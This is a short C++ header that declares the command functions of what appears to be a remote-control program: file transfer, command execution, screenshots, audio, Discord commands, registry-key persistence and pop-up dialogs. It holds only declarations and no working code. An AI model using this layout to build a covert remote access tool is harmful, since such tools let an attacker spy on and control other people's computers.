#ifndef COMMANDS_H
#define COMMANDS_H

#include <vector>
#include "simplecommand.h"
#include "controller.h"
#include "commandtypes.h"

// navigation
int navigation(Controller& ctrl, unsigned char cmd, const std::string path);
// files
int downloadFile(Controller& ctrl, const std::string path);
int uploadFile(Controller& ctrl, const std::string path, std::vector<char> data);
// exec
int exec(Controller& ctrl, std::string cmd, bool wait);
// screen
int screenshot(Controller& ctrl);
// audio
int audioCommand(Controller& ctrl, AudioCommand cmd);
// discord
int discordCommand(Controller& ctrl, DiscordCommand cmd);
// persistence
int persist(Controller& ctrl, const std::string regkey);
// dialog
int dialog(Controller& ctrl, uint32_t type, std::string message, std::string title);
// showoff
int showoff(Controller& ctrl, unsigned char type);

#endif